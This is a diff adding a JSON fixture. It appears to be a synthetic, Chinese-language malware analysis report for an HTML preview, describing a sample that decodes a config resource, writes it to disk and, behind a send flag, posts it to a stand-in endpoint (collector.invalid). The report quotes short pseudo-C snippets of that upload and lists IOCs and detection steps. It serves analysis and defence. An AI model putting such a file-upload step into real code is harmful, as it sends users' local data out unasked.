@@ -1,0 +1,253 @@
+{
+  "meta": {
+    "id": "HTML-REPORT",
+    "date": "2026-10-29",
+    "method": "静态分析（基于提供的源码与结构化分析结果）",
+    "edition": "HTML 预览",
+    "status": "HTML 预览",
+    "risk": "medium",
+    "verdict": "样本将资源配置落地，并由发送开关控制配置向外部端点提交；模式值还可选择附加处理。",
+    "audit": {
+      "status": "passed",
+      "refs_total": 7,
+      "refs_invalid": 0
+    },
+    "title": "配置解码、落地与条件提交样本（合成演示）"
+  },
+  "hashes": [],
+  "attack": [],
+  "attribution": null,
+  "yara": null,
+  "attribution_empty_reason": "暂无归因资料。",
+  "schema_version": "1.1",
+  "findings": [
+    {
+      "rule": "CONFIG-DECODE",
+      "title": "解码资源配置并落地",
+      "state": "confirmed",
+      "evidence": [
+        "F-0010 L1-L3",
+        "F-0010 L4-L7"
+      ],
+      "section": "mechanism-1"
+    },
+    {
+      "rule": "NET-CONNECT",
+      "title": "按开关向端点提交配置",
+      "state": "confirmed",
+      "evidence": [
+        "F-0010 L8-L11"
+      ],
+      "section": "mechanism-2"
+    },
+    {
+      "rule": "CUSTOM",
+      "title": "配置模式可能选择附加处理",
+      "state": "partial",
+      "evidence": [
+        "F-0020 L1-L5"
+      ],
+      "state_note": "目标例程尚未恢复，附加模式的用途待确认",
+      "section": "mechanism-1",
+      "tier": "info",
+      "category": "config",
+      "tier_reason": "仅能确认配置分支和间接调用，不能推定额外危害能力"
+    }
+  ],
+  "summary": [
+    "配置资源解码后写入本地文件；发送开关开启时，程序读取该文件并提交至指定端点。"
+  ],
+  "risk_judgement": "网络提交使配置内容具备离开本机的路径；影响取决于配置内容与发送开关，应优先核对这两项。",
+  "chain": [
+    {
+      "name": "解码资源",
+      "action": "配置解码失败则返回；成功后继续处理。",
+      "evidence": [
+        "F-0010 L1-L3"
+      ],
+      "key": false,
+      "phase": "配置准备",
+      "brief": "解码资源配置"
+    },
+    {
+      "name": "写出配置",
+      "action": "将解码后的配置缓冲区保存到本地路径。",
+      "evidence": [
+        "F-0010 L4-L7"
+      ],
+      "key": false,
+      "phase": "数据落地",
+      "brief": "写入配置文件"
+    },
+    {
+      "name": "条件提交",
+      "action": "发送开关开启时读取已写出的文件并提交。",
+      "evidence": [
+        "F-0010 L8-L11"
+      ],
+      "key": true,
+      "phase": "外部提交",
+      "brief": "按开关提交"
+    }
+  ],
+  "sections": [
+    {
+      "id": "mechanism-1",
+      "title": "资源配置如何落地并驱动后续流程",
+      "question": "配置来自哪里，如何进入后续数据流？",
+      "blocks": [
+        {
+          "type": "callout",
+          "text": "主流程先读取具名资源并解码。只有配置解码成功才创建文件，写出的缓冲区随后成为网络提交的数据来源。",
+          "tone": "info"
+        },
+        {
+          "type": "paragraph",
+          "text": "配置模式值为2时，程序还会解析并调用目标函数，可能扩展配置处理方式；该调用的具体用途尚未确定。"
+        },
+        {
+          "type": "kv",
+          "mono": true,
+          "items": [
+            {
+              "k": "配置资源",
+              "v": "HTML_PREVIEW_TEST"
+            },
+            {
+              "k": "落地路径",
+              "v": "C:\\HTML_PREVIEW_TEST\\demo.cfg"
+            }
+          ]
+        },
+        {
+          "type": "subheading",
+          "text": "配置写入的关键步骤 · F-0010 L4-L7"
+        },
+        {
+          "type": "code",
+          "language": "c",
+          "text": "L0004: path = \"C:\\HTML_PREVIEW_TEST\\demo.cfg\";\nL0005: h = CreateFileA(path, GENERIC_WRITE, 0, 0, CREATE_ALWAYS, 0, 0);\nL0006: WriteFile(h, config, config_size, &written, 0);\nL0007: CloseHandle(h);"
+        }
+      ]
+    },
+    {
+      "id": "mechanism-2",
+      "title": "发送开关如何控制配置提交",
+      "question": "何时发送，发送的数据来自哪里？",
+      "blocks": [
+        {
+          "type": "callout",
+          "text": "提交逻辑位于 send_enabled 分支：请求体通过读取落地配置文件取得，目标端点在分支内指定。该条件将本地写出与网络提交连接起来。",
+          "tone": "info"
+        },
+        {
+          "type": "steps",
+          "items": [
+            {
+              "title": "检查发送条件",
+              "text": "config->send_enabled 为真"
+            },
+            {
+              "title": "读取待提交数据",
+              "text": "C:\\HTML_PREVIEW_TEST\\demo.cfg"
+            },
+            {
+              "title": "提交至目标端点",
+              "text": "https://collector.invalid/preview"
+            }
+          ]
+        },
+        {
+          "type": "subheading",
+          "text": "开关、请求体与端点的对应关系 · F-0010 L8-L11"
+        },
+        {
+          "type": "code",
+          "language": "c",
+          "text": "L0008: if (config->send_enabled) {\nL0009:   body = read_demo_file(path);\nL0010:   endpoint = \"https://collector.invalid/preview\";\nL0011:   demo_http_post(endpoint, body);"
+        }
+      ]
+    }
+  ],
+  "ioc": {
+    "host": [
+      {
+        "type": "file",
+        "value": "C:\\HTML_PREVIEW_TEST\\demo.cfg",
+        "role": "输出落地",
+        "specificity": "high",
+        "note": "本地配置输出，可关联后续读取与请求活动。",
+        "evidence": [
+          "F-0010 L4-L7"
+        ]
+      },
+      {
+        "type": "resource",
+        "value": "HTML_PREVIEW_TEST",
+        "role": "配置标记",
+        "specificity": "high",
+        "note": "配置资源标记，用于关联资源解码路径。",
+        "evidence": [
+          "F-0010 L1-L3"
+        ]
+      }
+    ],
+    "network": [
+      {
+        "type": "network",
+        "value": "https://collector.invalid/preview",
+        "role": "其他对象",
+        "specificity": "high",
+        "note": "配置提交目标，可与请求体及进程行为联合筛查。",
+        "evidence": [
+          "F-0010 L8-L11"
+        ]
+      }
+    ]
+  },
+  "detection": [
+    {
+      "type": "steps",
+      "items": [
+        {
+          "title": "关联本地配置与外部提交",
+          "text": "关联同一进程的配置文件写入、随后读取与请求活动，重点核对发送开关及请求体来源。"
+        },
+        {
+          "title": "核对关联对象",
+          "text": "结合配置资源名、落地路径及提交端点检索，按具体对象用途进行比对。"
+        }
+      ]
+    }
+  ],
+  "response": [
+    {
+      "title": "保全配置与进程线索",
+      "text": "保全落地配置，核对其内容、关联进程及写入时间。"
+    },
+    {
+      "title": "确认提交范围",
+      "text": "结合发送开关与端点访问记录核查哪些配置数据具备外部提交路径。"
+    }
+  ],
+  "gaps": [
+    {
+      "gap": "附加模式的目标例程与具体用途尚未明确",
+      "impact": "不能将该路径认定为已经闭合的额外收集或外传能力",
+      "blocking": false
+    }
+  ],
+  "functions": [
+    {
+      "function": "F-0010 sub_preview_main",
+      "role": "配置写入的关键步骤",
+      "lines": "L0004-L0007"
+    },
+    {
+      "function": "F-0010 sub_preview_main",
+      "role": "开关、请求体与端点的对应关系",
+      "lines": "L0008-L0011"
+    }
+  ],
+  "final": "样本形成了资源解码、配置落地和条件网络提交的数据流，并存在可能扩展处理方式的模式调用。关联分析应优先结合配置文件、发送条件与目标端点。"
+}
